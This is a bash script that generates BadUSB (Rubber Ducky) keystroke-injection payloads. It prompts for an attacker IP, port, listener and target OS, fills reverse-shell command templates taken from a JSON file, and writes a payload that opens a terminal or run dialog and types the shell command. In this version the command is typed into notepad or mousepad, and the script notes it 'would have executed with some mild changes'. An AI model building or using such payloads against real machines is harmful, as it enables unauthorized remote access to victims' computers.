#!/bin/bash
#intake args
args=("$@")
#debug, echo args back
#echo ${args[0]}
echo "This script sucks. You were warned!"
echo "All input is NOT validated, and is case-sensitive. Did I mention this script sucks?"
echo -e "What is the IP of the listener/attacker? "
read ip
echo "Using $ip for destination of reverse shells"
echo -e "What port will you be listening on?"
read port
echo "Using $port for incoming shells"
echo "Displaying list of listeners"
jq '.ReverseShells.Listeners[].name' wipreverseshells.json
echo -e "What listener will you be using?"
read listener
echo "Your listener is: $listener"
listenercommand=$(jq ".ReverseShells.Listeners[] | select(.name==\"${listener}\") | .command"  wipreverseshells.json)
echo "What OS does your target run? (\"linux\",\"mac\",\"windows\" only)"
read osmeta
echo "Got it, displaying reverse shells available for use on $osmeta"
jq ".ReverseShells.Shells[] | (select(.meta[] | contains (\"${osmeta}\"))).name"  wipreverseshells.json
echo -e "Got it. Which reverse shell would you like to use"
read revshell
echo "Using $revshell for use on target to reverse shell back to attacker"
jq ".ReverseShells.TargetShells[].name"  wipreverseshells.json
echo -e "With $osmeta target, and reverse shell $revshell in mind, what of these shells do you want it to run for the reverse shell?"
read targetshell
#put command into variable, then display
reverseshellcommand=$(jq ".ReverseShells.Shells[] | select(.name==\"${revshell}\") | .command"  wipreverseshells.json)
#replace variable placeholders with... variables
reverseshellcommand2=$(echo $reverseshellcommand | sed "s^\${port}^$port^g")
reverseshellcommand2=$(echo $reverseshellcommand2 | sed "s^\${ip}^$ip^g")
reverseshellcommand2=$(echo $reverseshellcommand2 | sed "s^\${shell}^$targetshell^g")
echo "Your reverse shell command is: $reverseshellcommand2"
listenercommand=$(echo $listenercommand | sed "s^\${port}^$port^g")
listenercommand=$(echo $listenercommand | sed "s^\${ip}^$ip^g")
listenercommand=$(echo $listenercommand | sed "s^\${shell}^$targetshell^g")
echo "Your listener command is: $listenercommand"

#start generating ducky payload
if [ $osmeta == "windows" ] ; then
	echo "REM This payload was created by shelltobadusb.sh" > revshell.txt
	echo "REM this script sucks, and uses data from https://github.com/0dayCTF/reverse-shell-generator/blob/main/js/data.js" >> revshell.txt
	echo "DEFAULT_DELAY 300" >> revshell.txt
	echo "GUI r" >> revshell.txt
	echo "STRING notepad" >> revshell.txt
	echo "ENTER" >> revshell.txt
	echo "STRING $reverseshellcommand2" >> revshell.txt
	echo "ENTER" >> revshell.txt
	echo "STRING ^^^ This would have executed with some mild changes" >> revshell.txt 
fi

if [ $osmeta == "linux" ] ; then
	echo "REM This payload was created by shelltobadusb.sh" > revshell.txt
	echo "REM this script sucks, and uses data from https://github.com/0dayCTF/reverse-shell-generator/blob/main/js/data.js" >> revshell.txt
	echo "DEFAULT_DELAY 300" >> revshell.txt
	echo "CONTROL ALT t" >> revshell.txt
	echo "DELAY 250" >> revshell.txt
	echo "STRING mousepad" >> revshell.txt
	echo "ENTER" >> revshell.txt
	echo "STRING $reverseshellcommand2" >> revshell.txt
	echo "ENTER" >> revshell.txt
	echo "STRING ^^^ This would have executed with some mild changes" >> revshell.txt 
fi
